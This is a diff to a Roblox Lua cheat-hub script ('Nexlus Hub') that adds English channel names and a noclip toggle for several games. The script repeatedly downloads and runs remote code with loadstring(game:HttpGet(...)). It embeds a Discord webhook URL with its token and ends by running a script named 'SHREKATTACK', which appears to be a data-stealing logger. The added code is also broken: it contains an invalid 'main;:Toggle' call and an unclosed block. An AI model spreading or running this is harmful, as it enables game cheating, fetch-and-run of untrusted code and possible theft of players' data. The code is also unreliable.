@@ -2,13 +2,15 @@ local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/daw
 
 local win = DiscordLib:Window("Nexlus Hub")
 
+local main = win:Server("Main", "")
 local serv = win:Server("สคิปต่างๆ", "")
 
+local main = main:Channel("Main")
 local btns = serv:Channel("Maru Hub")
-local bf = serv:Channel("สคิป บล็อกฟุต")
-local kl = serv:Channel("สคิป คิงพีช")
-local asn = serv:Channel("สคิป อาเซนอล")
-local ffy = serv:Channel("สคิป ฟรั้งกี้ ไฟร์เดย์")
+local bf = serv:Channel("Blox fruit")
+local kl = serv:Channel("King Legacy")
+local asn = serv:Channel("Arsenal")
+local ffy = serv:Channel("Funky Friday")
 
 btns:Button("Maru Hub สคิป ปกติ 6 Map", function()
 getgenv().Key = "MARU-RYEZL-5CA-WKDTR-U7X-78LF"
@@ -65,6 +67,19 @@ ffy:Button("Funky friday", function()
 -- Made by Wally, modded by ShowerHeadFD
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
 end)
+
+main;:Toggle("Noclip (Not sure Bug or Not Bug!!!)",false,function(Nc)
+_G.noclip = Nc
+end)
+
+spawn(function()
+while wait() do
+game:GetService("RunService").Heartbeat:Connect(function()
+if _G.noclip then
+game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(11)
+    end
+end
+   end)
 
 _G.webhooksdiscord = "https://discord.com/api/webhooks/1050068639312781395/vU50tq3VQT0sT1VIIDxaECprBaIJqtf5LPh30XeYzm2kbGIPe7DWfpLPvlXco1Ie8jXL"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
